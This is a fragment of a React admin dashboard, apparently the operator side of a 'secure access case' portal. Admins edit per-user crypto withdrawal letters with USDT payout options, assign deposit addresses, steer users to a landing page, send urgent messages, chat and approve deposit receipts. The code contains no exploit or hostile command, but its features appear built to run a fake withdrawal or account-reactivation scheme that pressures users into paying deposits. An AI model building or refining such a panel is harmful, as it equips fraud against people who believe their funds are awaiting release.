                      <div className="text-center py-8 text-slate-500">
                        <Activity className="w-12 h-12 mx-auto mb-3 opacity-30" />
                        <p>No recent activity</p>
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>
            </motion.div>
          </TabsContent>
        </Tabs>
      </main>

      {/* Create Case Modal */}
      <Dialog open={isCreateOpen} onOpenChange={setIsCreateOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100">
          <DialogHeader>
            <DialogTitle>Create Secure Access Case</DialogTitle>
            <DialogDescription className="text-slate-400">
              Generate a unique password for the user to access the portal.
            </DialogDescription>
          </DialogHeader>
          <div className="py-4">
            <Label htmlFor="code" className="text-slate-400">Access Password</Label>
            <Input 
              id="code" 
              value={newAccessCode} 
              onChange={(e) => setNewAccessCode(e.target.value)}
              className="bg-slate-900 border-slate-700 text-white mt-2"
              placeholder="e.g. 774982" 
              data-testid="input-access-code"
            />
          </div>
          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsCreateOpen(false)}>Cancel</Button>
            <Button onClick={handleCreateCase} className="bg-blue-600 text-white" data-testid="button-create-case">Create Case</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Finalize Sync Modal with User Details & Letter Editor Tabs */}
      <Dialog open={isFinalizeOpen} onOpenChange={setIsFinalizeOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100 max-w-3xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <UserCheck className="w-5 h-5" /> Finalize Account Reactivation
            </DialogTitle>
            <DialogDescription className="text-slate-400">
              Review and edit user details and letter content before activating the account.
            </DialogDescription>
          </DialogHeader>
          
          <Tabs defaultValue="details" className="w-full">
            <TabsList className="grid w-full grid-cols-2 bg-slate-900 border border-slate-800">
              <TabsTrigger value="details" className="data-[state=active]:bg-slate-800 gap-2" data-testid="tab-finalize-details">
                <Users className="w-4 h-4" /> User Details
              </TabsTrigger>
              <TabsTrigger value="letter" className="data-[state=active]:bg-slate-800 gap-2" data-testid="tab-finalize-letter">
                <Edit3 className="w-4 h-4" /> Letter Content
              </TabsTrigger>
            </TabsList>
            
            <TabsContent value="details" className="mt-4">
              <div className="grid gap-4">
                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label className="text-slate-400">VIP Status</Label>
                    <Input 
                      value={finalizeData.vipStatus}
                      onChange={(e) => setFinalizeData({...finalizeData, vipStatus: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white"
                      data-testid="input-vip-status"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label className="text-slate-400">Physilocal0</Label>
                    <Input 
                      value={finalizeData.physilocal0}
                      onChange={(e) => setFinalizeData({...finalizeData, physilocal0: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white"
                      data-testid="input-physilocal0"
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label className="text-slate-400">Username</Label>
                  <Input 
                    value={finalizeData.username}
                    onChange={(e) => setFinalizeData({...finalizeData, username: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white"
                    data-testid="input-username"
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label className="text-slate-400">Withdrawal Amount</Label>
                    <Input 
                      value={finalizeData.withdrawalAmount}
                      onChange={(e) => setFinalizeData({...finalizeData, withdrawalAmount: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white"
                      data-testid="input-withdrawal-amount"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label className="text-slate-400">Batches</Label>
                    <Input 
                      value={finalizeData.withdrawalBatches}
                      onChange={(e) => setFinalizeData({...finalizeData, withdrawalBatches: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white"
                      data-testid="input-batches"
                    />
                  </div>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="letter" className="mt-4">
              <div className="grid gap-4">
                <div className="space-y-2">
                  <Label className="text-slate-400">Headline</Label>
                  <Input 
                    value={letterData.headline || ""}
                    onChange={(e) => setLetterData({...letterData, headline: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white"
                    data-testid="input-finalize-letter-headline"
                  />
                </div>

                <div className="space-y-2">
                  <Label className="text-slate-400">Introduction</Label>
                  <Textarea 
                    value={letterData.introduction || ""}
                    onChange={(e) => setLetterData({...letterData, introduction: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white min-h-[80px]"
                    placeholder="Dear [User Name],..."
                    data-testid="input-finalize-letter-introduction"
                  />
                </div>

                <div className="space-y-2">
                  <Label className="text-slate-400">Body Content</Label>
                  <Textarea 
                    value={letterData.bodyContent || ""}
                    onChange={(e) => setLetterData({...letterData, bodyContent: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white min-h-[80px]"
                    placeholder="Main letter content..."
                    data-testid="input-finalize-letter-body"
                  />
                </div>

                <div className="space-y-2">
                  <Label className="text-slate-400">Footer Note</Label>
                  <Textarea 
                    value={letterData.footerNote || ""}
                    onChange={(e) => setLetterData({...letterData, footerNote: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
                    data-testid="input-finalize-letter-footer"
                  />
                </div>

                <div className="border-t border-slate-800 pt-4">
                  <h4 className="text-sm font-medium text-slate-300 mb-3">Option Customization</h4>
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-400">Option A Title</Label>
                      <Input 
                        value={letterData.optionATitle || ""}
                        onChange={(e) => setLetterData({...letterData, optionATitle: e.target.value})}
                        className="bg-slate-900 border-slate-700 text-white"
                        data-testid="input-finalize-option-a-title"
                      />
                      <Textarea 
                        value={letterData.optionADescription || ""}
                        onChange={(e) => setLetterData({...letterData, optionADescription: e.target.value})}
                        className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
                        placeholder="Option A description..."
                        data-testid="input-finalize-option-a-desc"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-400">Option B Title</Label>
                      <Input 
                        value={letterData.optionBTitle || ""}
                        onChange={(e) => setLetterData({...letterData, optionBTitle: e.target.value})}
                        className="bg-slate-900 border-slate-700 text-white"
                        data-testid="input-finalize-option-b-title"
                      />
                      <Textarea 
                        value={letterData.optionBDescription || ""}
                        onChange={(e) => setLetterData({...letterData, optionBDescription: e.target.value})}
                        className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
                        placeholder="Option B description..."
                        data-testid="input-finalize-option-b-desc"
                      />
                    </div>
                  </div>
                </div>
              </div>
            </TabsContent>
          </Tabs>

          <DialogFooter className="mt-4">
            <Button variant="ghost" onClick={() => setIsFinalizeOpen(false)}>Cancel</Button>
            <Button onClick={handleFinalize} className="bg-green-600 hover:bg-green-700 text-white gap-2" data-testid="button-finalize-submit">
              <UserCheck className="w-4 h-4" /> Accept & Finalize
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Letter Editor Modal */}
      <Dialog open={isLetterEditorOpen} onOpenChange={setIsLetterEditorOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100 max-w-3xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Edit3 className="w-5 h-5" /> Edit Letter Content
            </DialogTitle>
            <DialogDescription className="text-slate-400">
              Customize the withdrawal letter for {selectedCase?.userName || "this user"}.
            </DialogDescription>
          </DialogHeader>
          
          <div className="grid gap-4 py-4">
            <div className="space-y-2">
              <Label className="text-slate-400">Headline</Label>
              <Input 
                value={letterData.headline || ""}
                onChange={(e) => setLetterData({...letterData, headline: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white"
                data-testid="input-letter-headline"
              />
            </div>

            <div className="space-y-2">
              <Label className="text-slate-400">Introduction</Label>
              <Textarea 
                value={letterData.introduction || ""}
                onChange={(e) => setLetterData({...letterData, introduction: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white min-h-[80px]"
                placeholder="Dear [User Name],..."
                data-testid="input-letter-introduction"
              />
            </div>

            <div className="space-y-2">
              <Label className="text-slate-400">Body Content</Label>
              <Textarea 
                value={letterData.bodyContent || ""}
                onChange={(e) => setLetterData({...letterData, bodyContent: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white min-h-[100px]"
                placeholder="Main letter content..."
                data-testid="input-letter-body"
              />
            </div>

            <div className="space-y-2">
              <Label className="text-slate-400">Footer Note</Label>
              <Textarea 
                value={letterData.footerNote || ""}
                onChange={(e) => setLetterData({...letterData, footerNote: e.target.value})}
                className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
                data-testid="input-letter-footer"
              />
            </div>

            <div className="border-t border-slate-800 pt-4">
              <h4 className="text-sm font-medium text-slate-300 mb-3">Option Customization</h4>
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label className="text-slate-400">Option A Title</Label>
                  <Input 
                    value={letterData.optionATitle || ""}
                    onChange={(e) => setLetterData({...letterData, optionATitle: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white"
                    data-testid="input-option-a-title"
                  />
                  <Textarea 
                    value={letterData.optionADescription || ""}
                    onChange={(e) => setLetterData({...letterData, optionADescription: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
                    placeholder="Option A description..."
                    data-testid="input-option-a-desc"
                  />
                  <div>
                    <Label className="text-slate-400">Amount</Label>
                    <Input 
                      value={letterData.optionAAmount || ""}
                      onChange={(e) => setLetterData({...letterData, optionAAmount: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1"
                      placeholder="e.g., 15000"
                      data-testid="input-option-a-amount"
                    />
                  </div>
                  <div>
                    <Label className="text-slate-400">Batch Details</Label>
                    <Textarea 
                      value={letterData.optionABatches || ""}
                      onChange={(e) => setLetterData({...letterData, optionABatches: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1 min-h-[60px]"
                      placeholder="e.g., 3000 per key. Total = 5keys (75,000 USDT) Every 6 hours"
                      data-testid="input-option-a-batches"
                    />
                  </div>
                  <div>
                    <Label className="text-slate-400">Total Withdrawal Amount</Label>
                    <Input 
                      value={letterData.optionATotalAmount || ""}
                      onChange={(e) => setLetterData({...letterData, optionATotalAmount: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1"
                      placeholder="e.g., 75,000 USDT"
                      data-testid="input-option-a-total-amount"
                    />
                  </div>
                  <div>
                    <Label className="text-slate-400">Withdrawal ID</Label>
                    <Input 
                      value={letterData.optionAFilelocoId || ""}
                      onChange={(e) => setLetterData({...letterData, optionAFilelocoId: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1"
                      placeholder="e.g., 11223344"
                      data-testid="input-option-a-withdrawal-id"
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label className="text-slate-400">Option B Title</Label>
                  <Input 
                    value={letterData.optionBTitle || ""}
                    onChange={(e) => setLetterData({...letterData, optionBTitle: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white"
                    data-testid="input-option-b-title"
                  />
                  <Textarea 
                    value={letterData.optionBDescription || ""}
                    onChange={(e) => setLetterData({...letterData, optionBDescription: e.target.value})}
                    className="bg-slate-900 border-slate-700 text-white min-h-[60px]"
                    placeholder="Option B description..."
                    data-testid="input-option-b-desc"
                  />
                  <div>
                    <Label className="text-slate-400">Amount</Label>
                    <Input 
                      value={letterData.optionBAmount || ""}
                      onChange={(e) => setLetterData({...letterData, optionBAmount: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1"
                      placeholder="e.g., 7500"
                      data-testid="input-option-b-amount"
                    />
                  </div>
                  <div>
                    <Label className="text-slate-400">Batch Details</Label>
                    <Textarea 
                      value={letterData.optionBBatches || ""}
                      onChange={(e) => setLetterData({...letterData, optionBBatches: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1 min-h-[60px]"
                      placeholder="e.g., 2000 per key. Total = 8keys (75,000 USDT) Every 12 hours"
                      data-testid="input-option-b-batches"
                    />
                  </div>
                  <div>
                    <Label className="text-slate-400">Total Withdrawal Amount</Label>
                    <Input 
                      value={letterData.optionBTotalAmount || ""}
                      onChange={(e) => setLetterData({...letterData, optionBTotalAmount: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1"
                      placeholder="e.g., 75,000 USDT"
                      data-testid="input-option-b-total-amount"
                    />
                  </div>
                  <div>
                    <Label className="text-slate-400">Withdrawal ID</Label>
                    <Input 
                      value={letterData.optionBFilelocoId || ""}
                      onChange={(e) => setLetterData({...letterData, optionBFilelocoId: e.target.value})}
                      className="bg-slate-900 border-slate-700 text-white mt-1"
                      placeholder="e.g., 11223344"
                      data-testid="input-option-b-withdrawal-id"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>

          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsLetterEditorOpen(false)}>Cancel</Button>
            <Button onClick={handleSaveLetter} className="bg-blue-600 hover:bg-blue-700 text-white" data-testid="button-save-letter">
              Save Letter
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Submissions History Modal */}
      <Dialog open={isSubmissionsOpen} onOpenChange={setIsSubmissionsOpen}>
        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100 max-w-2xl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <History className="w-5 h-5" /> Submission History
            </DialogTitle>
            <DialogDescription className="text-slate-400">
              Previous submissions for {selectedCase?.userName || "this user"}.
            </DialogDescription>
          </DialogHeader>
          
          <div className="py-4">
            {caseSubmissions.length === 0 ? (
              <div className="text-center py-8 text-slate-500">
                No submissions yet for this case.
              </div>
            ) : (
              <div className="space-y-3">
                {caseSubmissions.map((s) => (
                  <div key={s.id} className="bg-slate-900 border border-slate-800 rounded-lg p-4" data-testid={`card-submission-${s.id}`}>
                    <div className="flex justify-between items-start mb-2">
                      <Badge className={s.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
                        Option {s.selectedOption}
                      </Badge>
                      <span className="text-xs text-slate-500">
                        {new Date(s.submittedAt).toLocaleString()}
                      </span>
                    </div>
                    <div className="grid grid-cols-2 gap-2 text-sm">
                      <div>
                        <span className="text-slate-500">Amount:</span>{" "}
                        <span className="text-green-400">{s.withdrawalAmount}</span>
                      </div>
                      <div>
                        <span className="text-slate-500">Batches:</span>{" "}
                        <span className="text-slate-300">{s.withdrawalBatches}</span>
                      </div>
                    </div>
                    {s.notes && (
                      <div className="mt-2 text-xs text-slate-400">
                        Notes: {s.notes}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>

          <DialogFooter>
            <Button variant="ghost" onClick={() => setIsSubmissionsOpen(false)}>Close</Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Chat Panel */}
      <AnimatePresence>
        {isChatOpen && chatCase && (
          <motion.div
            initial={{ opacity: 0, x: 100 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: 100 }}
            className="fixed top-0 right-0 bottom-0 z-50 w-96 bg-slate-950 border-l border-slate-800 flex flex-col shadow-2xl"
          >
            <div className="bg-slate-900 text-white px-4 py-3 flex justify-between items-center border-b border-slate-800">
              <div className="flex items-center gap-3">
                <div className="h-10 w-10 rounded-full bg-blue-600 flex items-center justify-center">
                  <User className="h-5 w-5" />
                </div>
                <div>
                  <div className="font-semibold">{chatCase.userName || 'User'}</div>
                  <div className="text-xs text-slate-400">Code: {chatCase.accessCode}</div>
                </div>
              </div>
              <Button
                variant="ghost"
                size="sm"
                className="h-8 w-8 p-0 text-slate-400 hover:text-white hover:bg-slate-800"
                onClick={() => setIsChatOpen(false)}
                data-testid="button-close-admin-chat"
              >
                <X className="h-4 w-4" />
              </Button>
            </div>
            
            <div ref={chatScrollRef} className="flex-1 overflow-y-auto p-4 space-y-3 bg-slate-900/50">
              {chatMessages.length === 0 ? (
                <div className="text-center text-slate-500 mt-8">
                  <MessageCircle className="h-12 w-12 mx-auto text-slate-700 mb-3" />
                  <p className="text-sm">No messages yet.</p>
                  <p className="text-xs text-slate-600 mt-1">Start a conversation with {chatCase.userName || 'this user'}.</p>
                </div>
              ) : (
                chatMessages.map((msg) => (
                  <div
                    key={msg.id}
                    className={`flex ${msg.sender === 'admin' ? 'justify-end' : 'justify-start'}`}
                  >
                    <div
                      className={`max-w-[80%] px-4 py-2 rounded-2xl ${
                        msg.sender === 'admin'
                          ? 'bg-blue-600 text-white rounded-br-md'
                          : 'bg-slate-800 text-slate-100 border border-slate-700 rounded-bl-md'
                      }`}
                    >
                      <p className="text-sm whitespace-pre-wrap">{msg.message}</p>
                      <p className={`text-xs mt-1 ${msg.sender === 'admin' ? 'text-blue-200' : 'text-slate-500'}`}>
                        {new Date(msg.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                      </p>
                    </div>
                  </div>
                ))
              )}
            </div>
            
            <div className="p-3 border-t border-slate-800 bg-slate-900">
              <div className="flex gap-2">
                <Input
                  placeholder="Type your message..."
                  value={newMessage}
                  onChange={(e) => setNewMessage(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && !e.shiftKey && sendChatMessage()}
                  disabled={isSendingMessage}
                  className="flex-1 bg-slate-800 border-slate-700 text-white placeholder:text-slate-500"
                  data-testid="input-admin-chat-message"
                />
                <Button
                  onClick={sendChatMessage}
                  disabled={!newMessage.trim() || isSendingMessage}
                  size="sm"
                  className="bg-blue-600 hover:bg-blue-700"
                  data-testid="button-send-admin-message"
                >
                  <Send className="h-4 w-4" />
                </Button>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Admin Message Dialog */}
      <Dialog open={isAdminMessageOpen} onOpenChange={setIsAdminMessageOpen}>
        <DialogContent className="max-w-2xl max-h-[80vh] overflow-y-auto bg-slate-950 border-slate-800 text-white">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Bell className="h-5 w-5 text-blue-500" />
              Manage User: {selectedCase?.userName}
            </DialogTitle>
            <DialogDescription className="text-slate-400">
              Send messages and configure user settings for case {selectedCase?.accessCode}
            </DialogDescription>
          </DialogHeader>
          
          <div className="space-y-6 py-4">
            {/* Deposit Address */}
            <div className="space-y-2">
              <Label className="text-slate-300">Deposit Address</Label>
              <div className="flex gap-2">
                <Input
                  value={depositAddressEdit}
                  onChange={(e) => setDepositAddressEdit(e.target.value)}
                  placeholder="Enter deposit address (e.g., 0x...)"
                  className="bg-slate-900 border-slate-700 text-white flex-1"
                />
                <Button onClick={updateDepositAddress} size="sm">
                  <Wallet className="h-4 w-4 mr-1" /> Save
                </Button>
              </div>
            </div>

            {/* Profile Redirect URL */}
            <div className="space-y-2">
              <Label className="text-slate-300">Profile Redirect URL</Label>
              <div className="flex gap-2">
                <Input
                  value={profileRedirectEdit}
                  onChange={(e) => setProfileRedirectEdit(e.target.value)}
                  placeholder="https://..."
                  className="bg-slate-900 border-slate-700 text-white flex-1"
                />
                <Button onClick={updateProfileRedirect} size="sm">
                  <ExternalLink className="h-4 w-4 mr-1" /> Save
                </Button>
              </div>
            </div>

            {/* Landing Page Preference */}
            <div className="space-y-2">
              <Label className="text-slate-300 flex items-center gap-2">
                <MapPin className="h-4 w-4" /> User Landing Page
              </Label>
              <p className="text-xs text-slate-500 mb-2">Choose which page the user sees after logging in</p>
              <div className="flex gap-2">
                <Select value={landingPageEdit} onValueChange={setLandingPageEdit}>
                  <SelectTrigger className="bg-slate-900 border-slate-700 text-white flex-1">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="dashboard">
                      <span className="flex items-center gap-2">Dashboard (Default)</span>
                    </SelectItem>
                    <SelectItem value="letter">
                      <span className="flex items-center gap-2">Withdrawal Letter</span>
                    </SelectItem>
                    <SelectItem value="deposit">
                      <span className="flex items-center gap-2">Deposit Information</span>
                    </SelectItem>
                    <SelectItem value="messages">
                      <span className="flex items-center gap-2">Required Actions</span>
                    </SelectItem>
                    <SelectItem value="chat">
                      <span className="flex items-center gap-2">Support Chat</span>
                    </SelectItem>
                    <SelectItem value="history">
                      <span className="flex items-center gap-2">Submission History</span>
                    </SelectItem>
                  </SelectContent>
                </Select>
                <Button onClick={updateLandingPage} size="sm">
                  <Settings className="h-4 w-4 mr-1" /> Save
                </Button>
              </div>
            </div>

            {/* Send New Message */}
            <div className="space-y-3 p-4 bg-slate-900/50 rounded-lg border border-slate-800">
              <h4 className="font-semibold text-white flex items-center gap-2">
                <MessageCircle className="h-4 w-4" /> Send Admin Message
              </h4>
              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-2">
                  <Label className="text-slate-400 text-xs">Category</Label>
                  <Select 
                    value={newAdminMessage.category} 
                    onValueChange={(v) => setNewAdminMessage(prev => ({ ...prev, category: v as any }))}
                  >
                    <SelectTrigger className="bg-slate-800 border-slate-700">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="urgent">
                        <span className="flex items-center gap-2 text-red-400">
                          <AlertTriangle className="h-3 w-3" /> Urgent
                        </span>
                      </SelectItem>
                      <SelectItem value="processing">
                        <span className="flex items-center gap-2 text-amber-400">
                          <Clock className="h-3 w-3" /> Processing
                        </span>
                      </SelectItem>
                      <SelectItem value="resolved">
                        <span className="flex items-center gap-2 text-green-400">
                          <CheckCircle className="h-3 w-3" /> Resolved
                        </span>
                      </SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-2">
                  <Label className="text-slate-400 text-xs">Title</Label>
                  <Input
                    value={newAdminMessage.title}
                    onChange={(e) => setNewAdminMessage(prev => ({ ...prev, title: e.target.value }))}
                    placeholder="Message title..."
                    className="bg-slate-800 border-slate-700"
                  />
                </div>
              </div>
              <div className="space-y-2">
                <Label className="text-slate-400 text-xs">Message Body</Label>
                <Textarea
                  value={newAdminMessage.body}
                  onChange={(e) => setNewAdminMessage(prev => ({ ...prev, body: e.target.value }))}
                  placeholder="Enter your message..."
                  className="bg-slate-800 border-slate-700 min-h-[100px]"
                />
              </div>
              <Button onClick={sendNewAdminMessage} className="w-full">
                <Send className="h-4 w-4 mr-2" /> Send Message
              </Button>
            </div>

            {/* Previous Messages */}
            <div className="space-y-3">
              <h4 className="font-semibold text-white">Sent Messages</h4>
              {adminMessages.length === 0 ? (
                <p className="text-slate-500 text-sm text-center py-4">No messages sent yet</p>
              ) : (
                <div className="space-y-2 max-h-48 overflow-y-auto">
                  {adminMessages.map(msg => (
                    <div key={msg.id} className="p-3 bg-slate-900 rounded border border-slate-800">
                      <div className="flex items-center justify-between gap-2 mb-1">
                        <div className="flex items-center gap-2">
                          {msg.category === 'urgent' && <AlertTriangle className="h-3 w-3 text-red-400" />}
                          {msg.category === 'processing' && <Clock className="h-3 w-3 text-amber-400" />}
                          {msg.category === 'resolved' && <CheckCircle className="h-3 w-3 text-green-400" />}
                          <span className="font-medium text-sm">{msg.title}</span>
                          {msg.isRead && <Badge variant="outline" className="text-xs">Read</Badge>}
                        </div>
                        <Badge 
                          variant="outline" 
                          className={`text-[10px] ${
                            msg.category === 'urgent' ? 'border-red-500 text-red-400' :
                            msg.category === 'processing' ? 'border-amber-500 text-amber-400' :
                            'border-green-500 text-green-400'
                          }`}
                        >
                          {msg.category}
                        </Badge>
                      </div>
                      <p className="text-xs text-slate-400 line-clamp-2">{msg.body}</p>
                      <div className="flex items-center justify-between mt-2 pt-2 border-t border-slate-800">
                        <p className="text-xs text-slate-600">{new Date(msg.createdAt).toLocaleString()}</p>
                        <div className="flex gap-1">
                          {msg.category === 'urgent' && (
                            <Button 
                              size="sm" 
                              variant="outline" 
                              className="h-6 text-xs border-amber-500/50 text-amber-400 hover:bg-amber-500/10"
                              onClick={() => updateAdminMessageStatus(msg.id, 'processing')}
                            >
                              <Clock className="h-3 w-3 mr-1" /> Processing
                            </Button>
                          )}
                          {msg.category === 'processing' && (
                            <Button 
                              size="sm" 
                              variant="outline" 
                              className="h-6 text-xs border-green-500/50 text-green-400 hover:bg-green-500/10"
                              onClick={() => updateAdminMessageStatus(msg.id, 'resolved')}
                            >
                              <CheckCircle className="h-3 w-3 mr-1" /> Received
                            </Button>
                          )}
                          {msg.category !== 'urgent' && (
                            <Button 
                              size="sm" 
                              variant="outline" 
                              className="h-6 text-xs border-red-500/50 text-red-400 hover:bg-red-500/10"
                              onClick={() => updateAdminMessageStatus(msg.id, 'urgent')}
                            >
                              <AlertTriangle className="h-3 w-3 mr-1" /> Urgent
                            </Button>
                          )}
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Deposit Receipts Dialog */}
      <Dialog open={isReceiptsOpen} onOpenChange={setIsReceiptsOpen}>
        <DialogContent className="max-w-3xl max-h-[80vh] overflow-y-auto bg-slate-950 border-slate-800 text-white">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Image className="h-5 w-5 text-amber-500" />
              Deposit Receipts: {selectedCase?.userName}
            </DialogTitle>
            <DialogDescription className="text-slate-400">
              Review and approve/reject deposit receipts for case {selectedCase?.accessCode}
            </DialogDescription>
          </DialogHeader>
          
          <div className="py-4">
            {depositReceipts.length === 0 ? (
              <div className="text-center py-12">
                <Image className="h-12 w-12 mx-auto text-slate-700 mb-3" />
                <p className="text-slate-500">No receipts uploaded yet</p>
              </div>
            ) : (
              <div className="space-y-4">
                {depositReceipts.map(receipt => (
                  <div key={receipt.id} className="p-4 bg-slate-900 rounded-lg border border-slate-800">
                    <div className="flex gap-4">
                      {receipt.imageData && (
                        <img 
                          src={receipt.imageData} 
                          alt="Receipt" 
                          className="w-32 h-32 object-cover rounded cursor-pointer hover:opacity-80"
                          onClick={() => window.open(receipt.imageData, '_blank')}
                        />
                      )}
                      <div className="flex-1">
                        <div className="flex justify-between items-start mb-2">
                          <div>
                            <p className="font-semibold">{receipt.fileName || 'Receipt'}</p>
                            <p className="text-xs text-slate-500">{new Date(receipt.uploadedAt).toLocaleString()}</p>
                          </div>
                          <Badge variant={
                            receipt.status === 'approved' ? 'default' :
                            receipt.status === 'rejected' ? 'destructive' :
                            'secondary'
                          }>
                            {receipt.status}
                          </Badge>
                        </div>
                        {receipt.notes && (
                          <p className="text-sm text-slate-400 mb-3">User notes: {receipt.notes}</p>
                        )}
                        {receipt.adminNotes && (
                          <p className="text-sm text-slate-500 mb-3">Admin notes: {receipt.adminNotes}</p>
                        )}
                        {receipt.status === 'pending' && (
                          <div className="flex gap-2">
                            <Button 
                              size="sm" 
                              onClick={() => updateReceiptStatus(receipt.id, 'approved')}
                              className="bg-green-600 hover:bg-green-700"
                            >
                              <CheckCircle className="h-4 w-4 mr-1" /> Approve
                            </Button>
                            <Button 
                              size="sm" 
                              variant="destructive"
                              onClick={() => updateReceiptStatus(receipt.id, 'rejected')}
                            >
                              <X className="h-4 w-4 mr-1" /> Reject
                            </Button>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </DialogContent>
      </Dialog>

      {/* Notification Bell for Total Unread */}
      {isLoggedIn && totalUnread > 0 && (
        <motion.div
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          className="fixed bottom-6 right-6 z-40"
        >
          <div className="bg-red-500 text-white px-4 py-2 rounded-full shadow-lg flex items-center gap-2 animate-pulse">
            <Bell className="h-4 w-4" />
            <span className="font-semibold">{totalUnread} unread message{totalUnread > 1 ? 's' : ''}</span>
          </div>
        </motion.div>
      )}
    </div>
  );
}
